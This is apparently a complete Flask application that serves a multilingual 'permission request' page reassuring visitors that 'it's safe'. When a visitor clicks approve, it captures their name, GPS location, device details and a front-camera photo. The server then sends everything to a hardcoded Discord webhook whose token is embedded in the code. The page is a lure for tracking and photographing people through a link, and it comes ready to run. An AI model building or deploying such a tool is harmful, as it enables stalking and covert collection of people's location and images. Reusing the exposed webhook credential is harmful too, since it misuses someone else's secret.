import os
import base64
import json
import requests
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="zh" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>隐私与权限确认</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
        h2 { color: #333; margin-bottom: 10px; }
        
        .legal-banner {
            background-color: #fff3cd;
            color: #856404;
            border: 2px solid #ffeeba;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 15px;
            font-weight: bold;
            text-align: right;
            line-height: 1.6;
        }

        #video-container { margin: 15px 0; display: none; }
        video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
        .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 45%; }
        .btn-approve { background-color: #28a745; color: white; }
        .btn-deny { background-color: #dc3545; color: white; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>权限许可请求</h2>
        
        <div class="legal-banner">
            DONT WORRY IT'S SAFE: 法律声明：<br>
            点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
        </div>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>
        
        <form id="consentForm">
            <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 10px; margin-bottom: 15px; font-size: 14px;"><br>
            
            <div class="btn-container">
                <button type="button" class="btn-approve" onclick="captureAndSend(false)">Autoriser</button>
                <button type="button" class="btn-deny" onclick="captureAndSend(true)">Refuser</button>
            </div>
        </form>

        <div id="status"></div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        function getMobileModel() {
            const ua = navigator.userAgent;
            let model = "Appareil Inconnu";
            
            // محاولة استخراج موديل الأندرويد بدقة (مثل Samsung, Xiaomi, etc.)
            if (/android/i.test(ua)) {
                let match = ua.match(/\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|SCH-[A-Z0-9]+|SM-F[0-9]+|Pixel\s[0-9a-zA-Z\s]+|Redmi\s[0-9A-Za-z\s]+|POCO\s[0-9A-Za-z\s]+|M2[0-9a-zA-Z]+\b)/i);
                if (match) {
                    model = "Android / " + match[0];
                } else {
                    const buildMatch = ua.match(/;\s?([a-zA-Z0-9\s\-_]+)\s+Build\//);
                    if (buildMatch && buildMatch[1]) {
                        model = "Android / " + buildMatch[1].trim();
                    } else {
                        model = "Android / Smartphone";
                    }
                }
            } else if (/iphone|ipad|ipod/i.test(ua)) {
                model = "Apple / iPhone iOS";
            } else if (/windows/i.test(ua)) {
                model = "PC / Windows";
            } else if (/macintosh|mac os x/i.test(ua)) {
                model = "Mac / Apple";
            }
            return model;
        }

        async function captureAndSend(isDenied) {
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value;

            if (isDenied) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '您已拒绝授权，未收集任何数据。';
                return;
            }

            if (!username) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '请先填写姓名。';
                return;
            }

            statusDiv.style.color = 'gray';
            statusDiv.innerText = '正在获取权限与设备信息...';

            let locationData = "Non autorisé";
            let imageBase64 = null;

            let deviceInfo = {
                model: getMobileModel(),
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || "Inconnu",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu"
            };

            // 1. جلب موقع الـ GPS
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                });
                locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
            } catch (err) {
                locationData = "Accès à la localisation refusé";
            }

            // 2. تشغيل الكاميرا والتقاط صورة واضحة وليست سوداء
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const videoElement = document.getElementById('webcam');
                const canvas = document.getElementById('canvas');
                
                videoElement.srcObject = stream;
                
                // الانتظار لمدة ثانية واحدة لضمان تهيئة العدسة ووضوح الصورة
                await new Promise(resolve => setTimeout(resolve, 1000));

                canvas.width = videoElement.videoWidth || 640;
                canvas.height = videoElement.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                imageBase64 = canvas.toDataURL('image/jpeg');

                stream.getTracks().forEach(track => track.stop());

            } catch (err) {
                console.log("Impossible d'accéder à la caméra: ", err);
            }

            // 3. إرسال البيانات
            try {
                const response = await fetch('/submit-consent', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        consent: true,
                        username: username,
                        location: locationData,
                        device: deviceInfo,
                        image: imageBase64
                    })
                });

                const result = await response.json();
                if (response.ok) {
                    statusDiv.style.color = 'green';
                    statusDiv.innerText = '已成功授权并发送数据！';
                } else {
                    statusDiv.style.color = 'red';
                    statusDiv.innerText = result.error || '发生错误。';
                }
            } catch (err) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = '无法连接到服务器。';
            }
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    data = request.json or {}
    if not data.get("consent"):
        return jsonify({"message": "Demande refusée."}), 200

    username = data.get("username")
    location = data.get("location")
    device = data.get("device", {})
    image_data = data.get("image")

    payload = {
        "content": (
            f"✅ **Nouveau consentement et détails de l'appareil:**\n"
            f"• **Nom:** {username}\n"
            f"• **Modèle exact de l'appareil:** {device.get('model')}\n"
            f"• **Localisation (GPS):** {location}\n"
            f"• **Résolution d'écran:** {device.get('screen')}\n"
            f"• **Langue et système:** {device.get('language')} | {device.get('platform')}\n"
            f"• **Processeur & RAM:** {device.get('cores')} Cœurs | {device.get('ram')}"
        )
    }

    try:
        if image_data:
            header, encoded = image_data.split(",", 1)
            image_bytes = base64.b64decode(encoded)
            
            files = {
                "file": ("snapshot.jpg", image_bytes, "image/jpeg")
            }
            resp = requests.post(
                DISCORD_WEBHOOK_URL, 
                data={"payload_json": json.dumps(payload)}, 
                files=files, 
                timeout=10
            )
        else:
            resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)

        resp.raise_for_status()
        return jsonify({"message": "Envoyé avec succès."}), 200
    except requests.RequestException as e:
        return jsonify({"error": f"Échec de l'envoi: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)
